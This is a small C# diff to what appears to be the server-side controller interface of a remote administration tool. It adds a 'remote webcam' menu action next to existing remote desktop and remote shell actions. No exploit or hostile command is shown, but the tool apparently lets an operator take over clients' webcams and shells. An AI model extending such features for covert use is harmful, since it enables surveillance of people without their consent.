@@ -49,6 +49,11 @@ namespace Serveur.Views
             _frmMainController.frmRdp(getClient());
         }
 
+        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            _frmMainController.frmWbc(getClient());
+        }
+
         private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
         {
             _frmMainController.frmRms(getClient());
